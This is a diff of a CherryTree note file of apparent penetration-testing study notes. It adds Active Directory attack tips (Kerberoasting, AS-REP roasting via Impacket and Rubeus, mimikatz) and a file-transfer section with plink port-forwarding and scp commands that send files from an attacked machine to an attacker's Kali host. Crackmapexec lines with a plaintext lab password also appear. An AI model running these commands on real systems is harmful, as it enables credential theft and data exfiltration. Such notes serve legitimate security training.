@@ -622,9 +622,10 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
         <rich_text weight="heavy">his is exactly why we need to have multiple tools to accomplish a single task. When one fails, we can try another.</rich_text>
       </node>
     </node>
-    <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1689416622">
-      <rich_text>Here it will be AD</rich_text>
-      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690115952">
+    <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1690116232">
+      <rich_text>Check this cheatsheet: </rich_text>
+      <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
+      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690116428">
         <rich_text>We will use </rich_text>
         <rich_text weight="heavy">mimikatz</rich_text>
         <rich_text>:
@@ -669,6 +670,16 @@ Make sure to check every </rich_text>
 Make sure to check the </rich_text>
         <rich_text weight="heavy">default password</rich_text>
         <rich_text>.
+
+Try </rich_text>
+        <rich_text weight="heavy">Kerberoasting</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text weight="heavy">AS-Rep</rich_text>
+        <rich_text> using valid credentials (</rich_text>
+        <rich_text weight="heavy">Impacket suite</rich_text>
+        <rich_text>), or a valid sessions (</rich_text>
+        <rich_text weight="heavy">Rubeus</rich_text>
+        <rich_text>).
 
 Also check this link: </rich_text>
         <rich_text link="webs https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1">https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1</rich_text>
@@ -716,6 +727,29 @@ Also check this link: </rich_text>
         <codebox char_offset="36" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator # this will check domain users credentials
 proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator --local-auth # this will check local users credentials
 </codebox>
+      </node>
+      <node name="File Transfer" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1690116035" ts_lastsave="1690116187">
+        <rich_text>We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali (from the Pivot Machine):
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+If we don't have an interactive shell, we can use this to transfer using </rich_text>
+        <rich_text weight="heavy">scp</rich_text>
+        <rich_text>:
+Then we can transfer the files from the attacked machine:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+!Always use </rich_text>
+        <rich_text weight="heavy">scp</rich_text>
+        <rich_text> from </rich_text>
+        <rich_text weight="heavy">putty</rich_text>
+        <rich_text> (pscp.exe).</rich_text>
+        <codebox char_offset="109" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\plink.exe -ssh -l kali -pw "password" -N -L 0.0.0.0:6000:127.0.0.1:22 {kali IP}</codebox>
+        <codebox char_offset="248" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "y" | .\scp.exe -P 6000 file kali@{pivot IP}:file # this is to accespt the key
+echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual transfer</codebox>
       </node>
     </node>
   </node>
